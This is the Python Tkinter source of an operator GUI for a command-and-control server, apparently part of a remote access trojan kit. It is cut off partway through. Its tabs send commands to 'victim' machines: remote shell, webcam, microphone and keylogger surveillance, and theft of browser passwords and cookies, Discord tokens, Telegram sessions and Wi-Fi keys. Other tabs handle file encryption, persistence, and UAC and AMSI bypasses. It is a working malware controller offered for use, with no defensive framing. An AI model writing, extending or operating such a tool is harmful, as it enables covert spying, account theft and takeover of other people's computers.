#!/usr/bin/env python3
"""
Advanced C2 Server - Python Tkinter GUI Frontend (gui_server.py)
Full-featured GUI for s.py - All commands accessible from one interface.
"""
import sys, os, json, threading, time, datetime, base64, queue
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from s import AdvancedC2Server, ServerConfig, Logger

# ── Palette ────────────────────────────────────────────────────────────────
BG     = '#0d0f1a'; BG2   = '#12151f'; BG3    = '#1a1e2e'; PANEL  = '#1e2235'
BORDER = '#2a2f45'; ACCENT= '#00d4ff'; ACCENT2= '#7c3aed'
GREEN  = '#22c55e'; RED   = '#ef4444'; YELLOW = '#f59e0b'; ORANGE = '#f97316'
TEXT   = '#e2e8f0'; TEXT2 = '#94a3b8'; TEXT3  = '#64748b'
FM =(('Consolas',10)); FMS=(('Consolas',9))
FH1=(('Segoe UI',16,'bold')); FH2=(('Segoe UI',13,'bold'))
FH3=(('Segoe UI',11,'bold')); FB=(('Segoe UI',10)); FSM=(('Segoe UI',9))

# ── Widget helpers ─────────────────────────────────────────────────────────
def _lt(c):
    try:
        r,g,b=int(c[1:3],16),int(c[3:5],16),int(c[5:7],16)
        return '#{:02x}{:02x}{:02x}'.format(min(r+25,255),min(g+25,255),min(b+25,255))
    except: return c

def btn(p,t,c,bg=None,fg='white',f=None,px=10,py=5,**kw):
    if bg is None: bg=ACCENT2
    if f  is None: f=FB
    b=tk.Button(p,text=t,command=c,bg=bg,fg=fg,font=f,relief='flat',
                cursor='hand2',padx=px,pady=py,**kw)
    b.bind('<Enter>',lambda e,_bg=bg:b.config(bg=_lt(_bg)))
    b.bind('<Leave>',lambda e,_bg=bg:b.config(bg=_bg))
    return b

def lbl(p,t,f=None,fg=TEXT2,px=None,py=None,w=None,h=None,**kw):
    if f is None: f=FB
    if px is not None: kw['padx']=px
    if py is not None: kw['pady']=py
    if w is not None: kw['width']=w
    if h is not None: kw['height']=h
    if 'bg' not in kw: kw['bg']=p['bg']
    return tk.Label(p,text=t,font=f,fg=fg,**kw)

def sep(p): return tk.Frame(p,height=1,bg=BORDER)

def ent(p,tv=None,w=20,**kw):
    e=tk.Entry(p,textvariable=tv,width=w,bg=BG3,fg=TEXT,
               insertbackground=ACCENT,relief='flat',font=FMS,**kw)
    e.config(highlightthickness=1,highlightbackground=BORDER,highlightcolor=ACCENT)
    return e

def cmb(p,vals,tv=None,w=18,**kw):
    s=ttk.Style(); s.theme_use('clam')
    s.configure('D.TCombobox',fieldbackground=BG3,background=BG3,foreground=TEXT,
                bordercolor=BORDER,lightcolor=BG3,darkcolor=BG3,
                selectbackground=ACCENT2,selectforeground='white')
    return ttk.Combobox(p,values=vals,textvariable=tv,width=w,
                        style='D.TCombobox',font=FMS,**kw)

def stxt(p,h=8,**kw):
    return scrolledtext.ScrolledText(p,height=h,bg=BG2,fg=TEXT,
                                     insertbackground=ACCENT,font=FMS,
                                     relief='flat',wrap='word',
                                     highlightthickness=1,
                                     highlightbackground=BORDER,
                                     highlightcolor=ACCENT,**kw)

def sh_title(p,t):
    f=tk.Frame(p,bg=BG); f.pack(fill='x',pady=(8,2))
    tk.Label(f,text=t,font=FH3,fg=ACCENT2,bg=BG).pack(anchor='w')
    sep(f).pack(fill='x',pady=2)

# ── GUI Logger ─────────────────────────────────────────────────────────────
class GUILogger(Logger):
    def __init__(self,lf,dbg,q):
        super().__init__(lf,dbg); self.q=q
    def _l(self,level,msg,*_):
        ts=datetime.datetime.now().strftime('%H:%M:%S')
        col={'OK':ACCENT,'INFO':GREEN,'WARN':YELLOW,'FAIL':RED,'DEBUG':'#a855f7'}.get(level,TEXT)
        self.q.put(('log',ts,level,msg,col))

# ── Base Tab ────────────────────────────────────────────────────────────────
class Base(tk.Frame):
    def __init__(self,p,app): super().__init__(p,bg=BG); self.app=app
    @property
    def srv(self): return self.app.server
    def send(self,ct,params=None): self.app.send_command(ct,params)
    def log(self,m,lv='INFO'): self.app.add_log(m,lv)

class ScrollableTab(Base):
    def __init__(self,p,app):
        super().__init__(p,app)
        self.canvas = tk.Canvas(self, bg=BG, highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(self, orient='vertical', command=self.canvas.yview)
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        self.scrollbar.pack(side='right', fill='y')
        self.canvas.pack(side='left', fill='both', expand=True)
        self.container = tk.Frame(self.canvas, bg=BG)
        self.canvas_frame = self.canvas.create_window((0,0), window=self.container, anchor='nw')
        self.container.bind('<Configure>', self._on_frame_configure)
        self.canvas.bind('<Configure>', self._on_canvas_configure)
        self.canvas.bind('<Enter>', self._bind_mw)
        self.canvas.bind('<Leave>', self._unbind_mw)

    def _on_frame_configure(self, event):
        self.canvas.configure(scrollregion=self.canvas.bbox('all'))

    def _on_canvas_configure(self, event):
        self.canvas.itemconfig(self.canvas_frame, width=event.width)

    def _bind_mw(self, event):
        self.canvas.bind_all('<MouseWheel>', self._on_mw)

    def _unbind_mw(self, event):
        self.canvas.unbind_all('<MouseWheel>')

    def _on_mw(self, event):
        if self.canvas.winfo_exists():
            self.canvas.yview_scroll(int(-1*(event.delta/120)), 'units')
# ═══════════════════════════════════════════════════════════════════
# TAB 1 - Sessions
# ═══════════════════════════════════════════════════════════════════
class SessionsTab(Base):
    def __init__(self,p,app):
        super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Sessions',f=FH2,fg=ACCENT).pack(side='left')
        btn(hdr,'Refresh',self.refresh,bg=BG3,fg=ACCENT,py=4).pack(side='right')
        self.sv=tk.StringVar(value='No client selected')
        tk.Label(self,textvariable=self.sv,font=FSM,fg=YELLOW,bg=BG,anchor='w').pack(fill='x',padx=14)
        frm=tk.Frame(self,bg=BG,padx=12,pady=4); frm.pack(fill='both',expand=True)
        cols=('ID','IP/Mode','OS','Hostname','User','Admin','Status','Last Seen')
        self.tree=ttk.Treeview(frm,columns=cols,show='headings',height=18)
        s=ttk.Style()
        s.configure('Treeview',background=BG2,foreground=TEXT,fieldbackground=BG2,rowheight=26,font=FMS)
        s.configure('Treeview.Heading',background=BG3,foreground=ACCENT,font=FB,relief='flat')
        s.map('Treeview',background=[('selected',ACCENT2)],foreground=[('selected','white')])
        for c,w in zip(cols,[140,130,110,130,110,50,80,140]):
            self.tree.heading(c,text=c); self.tree.column(c,width=w,anchor='w')
        vsb=ttk.Scrollbar(frm,orient='vertical',command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        vsb.pack(side='right',fill='y'); self.tree.pack(fill='both',expand=True)
        self.tree.bind('<<TreeviewSelect>>',self._on_sel)
        self.tree.bind('<Double-1>',self._on_dbl)
        qf=tk.Frame(self,bg=BG,padx=12,pady=8); qf.pack(fill='x')
        for t,c,bg in [
            ('Select',self._sel,ACCENT2),('Deselect',self._desel,BG3),
            ('Shell',self._shell,'#16a34a'),('Screenshot',lambda:self.send('screenshot'),'#0369a1'),
            ('SysInfo',lambda:self.send('system_info'),'#0369a1'),
            ('Disconnect',self._disc,'#7f1d1d'),
        ]:
            btn(qf,t,c,bg=bg,fg=TEXT if bg==BG3 else 'white',py=6,px=12).pack(side='left',padx=4)

    def refresh(self):
        self.tree.delete(*self.tree.get_children())
        if not self.srv: return
        with self.srv.client_lock: cs=dict(self.srv.clients)
        try:
            rows=self.srv.db._conn_sqlite().execute(
                'SELECT id,ip_address,os,hostname,username,is_admin,status,last_seen FROM clients ORDER BY last_seen DESC LIMIT 200'
            ).fetchall()
        except: rows=[]
        seen=set()
        for r in rows:
            seen.add(r[0]); live=r[0] in cs
            md=' [M]' if live and cs[r[0]].get('mongo_transport') else (' [T]' if live else '')
            tag='online' if r[6]=='online' else 'offline'
            self.tree.insert('','end',values=(r[0][:16],str(r[1])+md,r[2] or '?',r[3] or '?',r[4] or '?','V' if r[5] else '',r[6],r[7] or ''),tags=(tag,))
        for cid,c in cs.items():
            if cid not in seen:
                inf=c.get('info') or {}
                self.tree.insert('','end',values=(cid[:16],c['addr'][0],inf.get('os','?'),inf.get('hostname','?'),inf.get('username','?'),'','online',''),tags=('online',))
        self.tree.tag_configure('online',foreground=GREEN)
        self.tree.tag_configure('offline',foreground=TEXT3)
        n=len(cs)
        self.sv.set(f'{n} live | Target: {self.app.selected_client or "broadcast"}')

    def _sid(self):
        s=self.tree.selection()
        return self.tree.item(s[0])['values'][0] if s else None

    def _fid(self,p):
        if self.srv:
            with self.srv.client_lock:
                for k in self.srv.clients:
                    if str(k).startswith(str(p)): return k
        return p

    def _on_sel(self,_=None):
        c=self._sid()
        if c: self.sv.set(f'Selected: {c}')
    def _on_dbl(self,_=None): self._sel()
    def _sel(self):
        c=self._sid()
        if c:
            fid=self._fid(c); self.app.select_client(fid)
            self.sv.set(f'Targeting: {fid}')
    def _desel(self):
        self.app.select_client(None); self.sv.set('Broadcast mode')
    def _shell(self):
        c=self._sid()
        if c: self.app.select_client(self._fid(c))
        self.app.notebook.select(self.app.tabs['Shell'])
    def _disc(self):
        cid=self._fid(self._sid() or '')
        if cid and messagebox.askyesno('Disconnect',f'Disconnect {cid}?'):
            try:
                with self.srv.client_lock: c=self.srv.clients.get(cid)
                if c and c.get('sock'): c['sock'].close()
            except: pass
# ═══════════════════════════════════════════════════════════════════
# TAB 2 - Shell
# ═══════════════════════════════════════════════════════════════════
class ShellTab(Base):
    def __init__(self,p,app):
        super().__init__(p,app); self._hist=[]; self._hidx=0; self._build()

    def _build(self):
        hdr=tk.Frame(self,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,4))
        lbl(hdr,'Interactive Shell',f=FH2,fg=ACCENT).pack(side='left')
        mf=tk.Frame(hdr,bg=BG); mf.pack(side='right')
        self.svar=tk.StringVar(value='shell')
        for t,v in [('CMD/Bash','shell'),('PowerShell','powershell')]:
            tk.Radiobutton(mf,text=t,variable=self.svar,value=v,bg=BG,fg=TEXT2,
                           selectcolor=BG3,activebackground=BG,font=FSM).pack(side='left',padx=4)
        self.out=stxt(self,h=22); self.out.pack(fill='both',expand=True,padx=12,pady=4)
        self.out.config(state='disabled')
        for tg,cl in [('prompt',ACCENT),('result',TEXT),('err',RED),('info',YELLOW),('ok',GREEN)]:
            self.out.tag_configure(tg,foreground=cl)
        inf=tk.Frame(self,bg=BG,padx=12,pady=6); inf.pack(fill='x')
        lbl(inf,'>>',fg=ACCENT,f=FH3).pack(side='left')
        self.cv=tk.StringVar()
        self.ce=ent(inf,tv=self.cv,w=70)
        self.ce.pack(side='left',padx=6,fill='x',expand=True)
        self.ce.bind('<Return>',self._send)
        self.ce.bind('<Up>',self._hu)
        self.ce.bind('<Down>',self._hd)
        btn(inf,'Send',self._send,bg=ACCENT2,py=6).pack(side='left',padx=4)
        btn(inf,'Clear',self._clr,bg=BG3,fg=TEXT2,py=6).pack(side='left',padx=2)
        self.ce.focus()

    def _send(self,*_):
        t=self.cv.get().strip()
        if not t: return
        self._hist.append(t); self._hidx=len(self._hist); self.cv.set('')
        self._pr(f'>> {t}\n','prompt')
        self.send(self.svar.get(),{'command':t})

    def _clr(self):
        self.out.config(state='normal'); self.out.delete('1.0','end'); self.out.config(state='disabled')

    def _hu(self,*_):
        if self._hist and self._hidx>0: self._hidx-=1; self.cv.set(self._hist[self._hidx])
    def _hd(self,*_):
        if self._hidx<len(self._hist)-1: self._hidx+=1; self.cv.set(self._hist[self._hidx])
        else: self._hidx=len(self._hist); self.cv.set('')

    def _pr(self,t,tag='result'):
        self.out.config(state='normal'); self.out.insert('end',t,tag)
        self.out.see('end'); self.out.config(state='disabled')

    def inject(self,data):
        if isinstance(data,dict):
            if data.get('stdout'): self._pr(data['stdout'],'result')
            if data.get('stderr'): self._pr(data['stderr'],'err')
            if 'returncode' in data: self._pr(f"[RC:{data['returncode']}][CWD:{data.get('cwd','?')}]\n",'info')
        else: self._pr(str(data)+'\n','result')
# ═══════════════════════════════════════════════════════════════════
# TAB 3 - Surveillance
# ═══════════════════════════════════════════════════════════════════
class SurveillanceTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Surveillance & Monitoring',f=FH2,fg=ACCENT).pack(side='left')
        cols=tk.Frame(self.container,bg=BG); cols.pack(fill='both',expand=True,padx=12,pady=4)
        L=tk.Frame(cols,bg=BG); L.pack(side='left',fill='both',expand=True,padx=(0,6))
        R=tk.Frame(cols,bg=BG); R.pack(side='left',fill='both',expand=True)

        # LEFT: Screenshot
        sh_title(L,'Screenshot')
        sf=tk.Frame(L,bg=PANEL,pady=8,padx=10); sf.pack(fill='x',pady=(0,6))
        lbl(sf,'Height (0=full screen):').pack(anchor='w')
        self.ssh=tk.IntVar(value=0); ent(sf,tv=self.ssh,w=10).pack(anchor='w',pady=3)
        btn(sf,'Take Screenshot',lambda:self.send('screenshot',{'height':self.ssh.get()}),bg='#0369a1').pack(anchor='w')

        # LEFT: Webcam Snapshot
        sh_title(L,'Webcam Snapshot')
        wf=tk.Frame(L,bg=PANEL,pady=8,padx=10); wf.pack(fill='x',pady=(0,6))
        lbl(wf,'Resolution:').pack(anchor='w')
        self.wcr=tk.StringVar(value='640x480')
        cmb(wf,['640x480','800x600','1280x720','1920x1080'],tv=self.wcr,w=14).pack(anchor='w',pady=3)
        btn(wf,'Capture Photo',lambda:self.send('webcam',{'resolution':self.wcr.get()}),bg='#0369a1').pack(anchor='w')

        # LEFT: Microphone
        sh_title(L,'Microphone Record')
        mf=tk.Frame(L,bg=PANEL,pady=8,padx=10); mf.pack(fill='x',pady=(0,6))
        lbl(mf,'Duration (seconds):').pack(anchor='w')
        self.mcd=tk.IntVar(value=10); ent(mf,tv=self.mcd,w=10).pack(anchor='w',pady=3)
        btn(mf,'Record Mic',lambda:self.send('microphone',{'duration':self.mcd.get()}),bg='#0369a1').pack(anchor='w')

        # LEFT: Keylogger
        sh_title(L,'Keylogger')
        kf=tk.Frame(L,bg=PANEL,pady=8,padx=10); kf.pack(fill='x',pady=(0,6))
        for t,a,c in [('Start','start',GREEN),('Stop','stop',RED),('Dump','dump',ACCENT2),
                      ('Status','status','#0369a1'),('Clear','clear',BG3)]:
            btn(kf,t,lambda _a=a:self.send('keylog',{'action':_a}),
                bg=c,fg='white' if c!=BG3 else TEXT2,py=4,px=7).pack(side='left',padx=2)

        # RIGHT: Live Screen Stream
        sh_title(R,'Live Screen Stream')
        stf=tk.Frame(R,bg=PANEL,pady=8,padx=10); stf.pack(fill='x',pady=(0,6))
        r1=tk.Frame(stf,bg=PANEL); r1.pack(fill='x',pady=2)
        lbl(r1,'FPS:',fg=TEXT2).pack(side='left')
        self.sfps=tk.IntVar(value=20); ent(r1,tv=self.sfps,w=5).pack(side='left',padx=4)
        lbl(r1,'Height:',fg=TEXT2).pack(side='left')
        self.sh=tk.IntVar(value=600); ent(r1,tv=self.sh,w=6).pack(side='left',padx=4)
        lbl(r1,'Quality:',fg=TEXT2).pack(side='left')
        self.sq=tk.IntVar(value=40); ent(r1,tv=self.sq,w=5).pack(side='left',padx=4)
        r2=tk.Frame(stf,bg=PANEL); r2.pack(fill='x',pady=4)
        btn(r2,'Start Stream',lambda:self.send('stream',{'action':'start','fps':self.sfps.get(),'height':self.sh.get(),'quality':self.sq.get()}),bg=GREEN).pack(side='left',padx=3)
        btn(r2,'Stop Stream',lambda:self.send('stream',{'action':'stop'}),bg=RED).pack(side='left',padx=3)

        # RIGHT: Screen Recording
        sh_title(R,'Screen Recording (Server-side)')
        rf=tk.Frame(R,bg=PANEL,pady=8,padx=10); rf.pack(fill='x',pady=(0,6))
        r=tk.Frame(rf,bg=PANEL); r.pack(fill='x',pady=2)
        lbl(r,'Duration (0=manual):',fg=TEXT2).pack(side='left')
        self.rsd=tk.IntVar(value=0); ent(r,tv=self.rsd,w=7).pack(side='left',padx=4)
        r2=tk.Frame(rf,bg=PANEL); r2.pack(fill='x',pady=4)
        btn(r2,'Rec Screen',self._rss,bg='#7c2d12').pack(side='left',padx=3)
        btn(r2,'Stop Rec',self._rstop,bg=BG3,fg=TEXT2).pack(side='left',padx=3)

        # RIGHT: Live Webcam Stream
        sh_title(R,'Live Webcam Stream')
        wcsf=tk.Frame(R,bg=PANEL,pady=8,padx=10); wcsf.pack(fill='x',pady=(0,6))
        r1=tk.Frame(wcsf,bg=PANEL); r1.pack(fill='x',pady=2)
        lbl(r1,'FPS:',fg=TEXT2).pack(side='left')
        self.wfps=tk.IntVar(value=20); ent(r1,tv=self.wfps,w=5).pack(side='left',padx=4)
        lbl(r1,'Res:',fg=TEXT2).pack(side='left')
        self.wres=tk.StringVar(value='800x600')
        cmb(r1,['640x480','800x600','1280x720'],tv=self.wres,w=10).pack(side='left',padx=4)
        lbl(r1,'Q:',fg=TEXT2).pack(side='left')
        self.wq=tk.IntVar(value=40); ent(r1,tv=self.wq,w=5).pack(side='left',padx=4)
        r2=tk.Frame(wcsf,bg=PANEL); r2.pack(fill='x',pady=4)
        btn(r2,'Start Webcam',lambda:self.send('webcam_stream',{'action':'start','fps':self.wfps.get(),'resolution':self.wres.get(),'quality':self.wq.get()}),bg=GREEN).pack(side='left',padx=3)
        btn(r2,'Stop',lambda:self.send('webcam_stream',{'action':'stop'}),bg=RED).pack(side='left',padx=3)

        # RIGHT: Audio
        sh_title(R,'Live Audio Stream')
        af=tk.Frame(R,bg=PANEL,pady=8,padx=10); af.pack(fill='x',pady=(0,6))
        r=tk.Frame(af,bg=PANEL); r.pack(fill='x')
        btn(r,'Start Audio',lambda:self.send('audio_stream',{'action':'start'}),bg=GREEN).pack(side='left',padx=3)
        btn(r,'Stop Audio',lambda:self.send('audio_stream',{'action':'stop'}),bg=RED).pack(side='left',padx=3)
        btn(r,'Rec Audio',self._ras,bg='#7c2d12').pack(side='left',padx=3)
        btn(r,'Stop Rec',self._rastop,bg=BG3,fg=TEXT2).pack(side='left',padx=3)

        # RIGHT: Clipboard & Window
        sh_title(R,'Clipboard & Window Logger')
        cf=tk.Frame(R,bg=PANEL,pady=8,padx=10); cf.pack(fill='x',pady=(0,6))
        r=tk.Frame(cf,bg=PANEL); r.pack(fill='x',pady=2)
        btn(r,'Get Clipboard',lambda:self.send('clipboard',{'action':'get'}),bg=ACCENT2).pack(side='left',padx=3)
        self.ct=tk.StringVar(); ent(cf,tv=self.ct,w=28).pack(anchor='w',pady=4)
        btn(cf,'Set Clipboard',lambda:self.send('clipboard',{'action':'set','text':self.ct.get()}),bg='#0369a1').pack(anchor='w')
        sep(cf).pack(fill='x',pady=5)
        r2=tk.Frame(cf,bg=PANEL); r2.pack(fill='x')
        for t,cmd in [('Active Win',lambda:self.send('active_window')),
                      ('Wlog Start',lambda:self.send('window_logger',{'action':'start','interval':1.0})),
                      ('Wlog Stop',lambda:self.send('window_logger',{'action':'stop'})),
                      ('Wlog Dump',lambda:self.send('window_logger',{'action':'dump'})),
                      ('Wlog Clear',lambda:self.send('window_logger',{'action':'clear'}))]:
            btn(r2,t,cmd,bg=ACCENT2,py=4,px=6).pack(side='left',padx=2)

    def _rss(self):
        if self.srv: self.log(self.srv._start_recording('stream',self.rsd.get()),'OK')
    def _rstop(self):
        if self.srv: self.log(self.srv._stop_recording('stream'),'OK')
    def _ras(self):
        if self.srv: self.log(self.srv._start_audio_recording(0),'OK')
    def _rastop(self):
        if self.srv: self.log(self.srv._stop_audio_recording(),'OK')
# ═══════════════════════════════════════════════════════════════════
# TAB 4 - Credentials
# ═══════════════════════════════════════════════════════════════════
class CredsTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Credential Harvesting',f=FH2,fg=ACCENT).pack(side='left')
        grid=tk.Frame(self.container,bg=BG); grid.pack(fill='both',expand=True,padx=12,pady=6)
        cards=[
            ('Browser Passwords','Dump saved passwords from Chrome, Edge,\nBrave, Opera, Opera GX.',lambda:self.send('browser_passwords')),
            ('Browser Cookies','Dump all browser cookies.',lambda:self.send('browser_cookies')),
            ('Browser History','Dump browser history.',lambda:self._hist()),
            ('Live Cookies (CDP)','Bypass App-Bound Encryption via CDP.\nEnter URL below.',lambda:self._live()),
            ('Wi-Fi Passwords','Extract saved Wi-Fi SSIDs + passwords.',lambda:self.send('wifi_passwords')),
            ('Discord Tokens','Steal Discord auth tokens from leveldb.',lambda:self.send('extract_discord')),
            ('Telegram Session','Package Telegram tdata as ZIP.',lambda:self.send('extract_telegram')),
            ('Outlook Data','Find Outlook .pst/.ost paths + registry.',lambda:self.send('extract_outlook')),
            ('ChromeElevator','Run Chromelevator for low-level extraction.',lambda:self.send('chromelevator')),
        ]
        for i,(title,desc,cmd) in enumerate(cards):
            row,col=divmod(i,3)
            card=tk.Frame(grid,bg=PANEL,padx=12,pady=12,highlightthickness=1,highlightbackground=BORDER)
            card.grid(row=row,column=col,padx=5,pady=5,sticky='nsew')
            grid.columnconfigure(col,weight=1)
            tk.Label(card,text=title,font=FH3,fg=ACCENT,bg=PANEL,anchor='w').pack(anchor='w')
            tk.Label(card,text=desc,font=FSM,fg=TEXT2,bg=PANEL,justify='left',wraplength=190).pack(anchor='w',pady=4)
            btn(card,'Execute',cmd,bg=ACCENT2,py=4).pack(anchor='w')
        xf=tk.Frame(self.container,bg=BG,padx=12); xf.pack(fill='x',pady=6)
        lbl(xf,'History Limit:').pack(side='left')
        self.hlim=tk.IntVar(value=1000); ent(xf,tv=self.hlim,w=8).pack(side='left',padx=5)
        lbl(xf,'  Live Cookie URL:').pack(side='left')
        self.lurl=tk.StringVar(value='https://www.instagram.com')
        ent(xf,tv=self.lurl,w=36).pack(side='left',padx=5)

    def _hist(self): self.send('browser_history',{'limit':self.hlim.get()})
    def _live(self):
        u=self.lurl.get().strip()
        if not u: messagebox.showwarning('URL','Enter a URL'); return
        self.send('browser_cookies',{'mode':'live','url':u})

# ═══════════════════════════════════════════════════════════════════
# TAB 5 - Files
# ═══════════════════════════════════════════════════════════════════
class FilesTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'File Operations',f=FH2,fg=ACCENT).pack(side='left')
        main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=6)

        pf=tk.Frame(main,bg=PANEL,pady=8,padx=10); pf.pack(fill='x',pady=(0,7))
        lbl(pf,'Remote Path:',fg=ACCENT).pack(anchor='w')
        self.rp=tk.StringVar(value='C:\\Users')
        ent(pf,tv=self.rp,w=56).pack(fill='x',pady=3)
        r=tk.Frame(pf,bg=PANEL); r.pack(fill='x')
        for t,c,cbg in [('Browse Dir',lambda:self.send('file_browser',{'path':self.rp.get()}),ACCENT2),
                        ('Download',lambda:self.send('download',{'path':self.rp.get()}),'#0369a1'),
                        ('Read File',lambda:self.send('read_file',{'path':self.rp.get()}),ACCENT2),
                        ('List Drives',lambda:self.send('list_drives'),BG3)]:
            btn(r,t,c,bg=cbg,fg='white' if cbg!=BG3 else TEXT2,py=4,px=7).pack(side='left',padx=2)

        wf=tk.Frame(main,bg=PANEL,pady=8,padx=10); wf.pack(fill='x',pady=(0,7))
        lbl(wf,'Write to Remote File:',fg=ACCENT).pack(anchor='w')
        r2=tk.Frame(wf,bg=PANEL); r2.pack(fill='x',pady=3)
        lbl(r2,'Path:').pack(side='left')
        self.wp=tk.StringVar(); ent(r2,tv=self.wp,w=38).pack(side='left',padx=5)
        lbl(wf,'Content:').pack(anchor='w')
        self.wc=stxt(wf,h=4); self.wc.pack(fill='x',pady=3)
        btn(wf,'Write File',self._wf,bg='#0369a1').pack(anchor='w')

        uf=tk.Frame(main,bg=PANEL,pady=8,padx=10); uf.pack(fill='x',pady=(0,7))
        lbl(uf,'Upload File to Victim:',fg=ACCENT).pack(anchor='w')
        r3=tk.Frame(uf,bg=PANEL); r3.pack(fill='x',pady=3)
        self.up=tk.StringVar(); ent(r3,tv=self.up,w=44).pack(side='left',padx=3)
        btn(r3,'Browse',self._bup,bg=BG3,fg=TEXT2,py=4).pack(side='left',padx=3)
        btn(r3,'Upload',self._dup,bg=GREEN).pack(side='left',padx=3)

        cf=tk.Frame(main,bg=PANEL,pady=8,padx=10); cf.pack(fill='x',pady=(0,7))
        lbl(cf,'Encrypt / Decrypt File/Folder:',fg=ACCENT).pack(anchor='w')
        r4=tk.Frame(cf,bg=PANEL); r4.pack(fill='x',pady=3)
        lbl(r4,'Path:').pack(side='left')
        self.cp=tk.StringVar(); ent(r4,tv=self.cp,w=38).pack(side='left',padx=5)
        r5=tk.Frame(cf,bg=PANEL); r5.pack(fill='x',pady=2)
        btn(r5,'Encrypt',lambda:self.send('file_crypt',{'path':self.cp.get(),'action':'encrypt'}),bg=RED,py=4).pack(side='left',padx=3)
        btn(r5,'Decrypt',lambda:self.send('file_crypt',{'path':self.cp.get(),'action':'decrypt'}),bg=GREEN,py=4).pack(side='left',padx=3)

    def _wf(self): self.send('write_file',{'path':self.wp.get(),'content':self.wc.get('1.0','end').rstrip('\n')})
    def _bup(self):
        p=filedialog.askopenfilename()
        if p: self.up.set(p)
    def _dup(self):
        lp=self.up.get().strip()
        if not lp: return
        try:
            with open(lp,'rb') as f: d=base64.b64encode(f.read()).decode()
            self.send('upload',{'filename':os.path.basename(lp),'data':d})
        except Exception as e: messagebox.showerror('Upload Error',str(e))
# ═══════════════════════════════════════════════════════════════════
# TAB 6 - System Control
# ═══════════════════════════════════════════════════════════════════
class SystemTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'System Control',f=FH2,fg=ACCENT).pack(side='left')
        main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=4)
        L=tk.Frame(main,bg=BG); L.pack(side='left',fill='both',expand=True,padx=(0,6))
        R=tk.Frame(main,bg=BG); R.pack(side='left',fill='both',expand=True)

        # LEFT
        sh_title(L,'Information & Recon')
        inf=tk.Frame(L,bg=PANEL,pady=8,padx=10); inf.pack(fill='x',pady=(0,6))
        for t,cmd in [('SysInfo',lambda:self.send('system_info')),
                      ('Process List',lambda:self.send('process',{'action':'list'})),
                      ('Netstat',lambda:self.send('netstat')),
                      ('ARP Table',lambda:self.send('arp')),
                      ('AV Check',lambda:self.send('av_discovery')),
                      ('Drives',lambda:self.send('list_drives')),
                      ('Active Window',lambda:self.send('active_window'))]:
            btn(inf,t,cmd,bg=ACCENT2,py=4,px=6).pack(side='left',padx=2,pady=2)

        sh_title(L,'Process Control')
        pf=tk.Frame(L,bg=PANEL,pady=8,padx=10); pf.pack(fill='x',pady=(0,6))
        r=tk.Frame(pf,bg=PANEL); r.pack(fill='x')
        lbl(r,'PID:').pack(side='left')
        self.kpid=tk.StringVar(); ent(r,tv=self.kpid,w=10).pack(side='left',padx=5)
        btn(r,'Kill Process',lambda:self.send('process',{'action':'kill','pid':self.kpid.get()}),bg=RED).pack(side='left',padx=4)

        sh_title(L,'Registry (Windows)')
        regf=tk.Frame(L,bg=PANEL,pady=8,padx=10); regf.pack(fill='x',pady=(0,6))
        lbl(regf,'Path:').pack(anchor='w')
        self.rp=tk.StringVar(value=r'HKCU\Software')
        ent(regf,tv=self.rp,w=40).pack(anchor='w',pady=3)
        r2=tk.Frame(regf,bg=PANEL); r2.pack(fill='x')
        btn(r2,'Read',lambda:self.send('registry',{'action':'read','path':self.rp.get()}),bg=ACCENT2,py=4).pack(side='left',padx=3)
        btn(r2,'Delete',lambda:self.send('registry',{'action':'delete','path':self.rp.get()}),bg=RED,py=4).pack(side='left',padx=3)

        sh_title(L,'Power Controls')
        pwf=tk.Frame(L,bg=PANEL,pady=8,padx=10); pwf.pack(fill='x',pady=(0,6))
        for t,a,c in [('Lock','lock','#1d4ed8'),('Shutdown','shutdown',RED),('Reboot','reboot',ORANGE)]:
            btn(pwf,t,lambda _a=a:self.send('power',{'action':_a}),bg=c,py=5,px=10).pack(side='left',padx=3)

        # RIGHT
        sh_title(R,'Persistence')
        prs=tk.Frame(R,bg=PANEL,pady=8,padx=10); prs.pack(fill='x',pady=(0,6))
        btn(prs,'Install Persistence',lambda:self.send('persistence'),bg=RED).pack(side='left',padx=3)
        btn(prs,'Remove Persistence',lambda:self.send('unpersist'),bg=BG3,fg=TEXT2).pack(side='left',padx=3)

        sh_title(R,'Privilege Escalation')
        pe=tk.Frame(R,bg=PANEL,pady=8,padx=10); pe.pack(fill='x',pady=(0,6))
        r1=tk.Frame(pe,bg=PANEL); r1.pack(fill='x',pady=2)
        btn(r1,'Elevate (UAC prompt)',lambda:self.send('elevate'),bg=RED).pack(side='left',padx=3)
        btn(r1,'AMSI Bypass',lambda:self.send('amsi_bypass'),bg='#7c2d12').pack(side='left',padx=3)
        r2=tk.Frame(pe,bg=PANEL); r2.pack(fill='x',pady=4)
        lbl(r2,'UAC Bypass Program:',fg=TEXT2).pack(side='left')
        self.up=tk.StringVar(); ent(r2,tv=self.up,w=26).pack(side='left',padx=4)
        btn(r2,'UAC Bypass',lambda:self.send('uac_bypass',{'method':'auto','program':self.up.get() or None}),bg=RED).pack(side='left',padx=3)

        sh_title(R,'Remote Desktop (RDP)')
        rdp=tk.Frame(R,bg=PANEL,pady=8,padx=10); rdp.pack(fill='x',pady=(0,6))
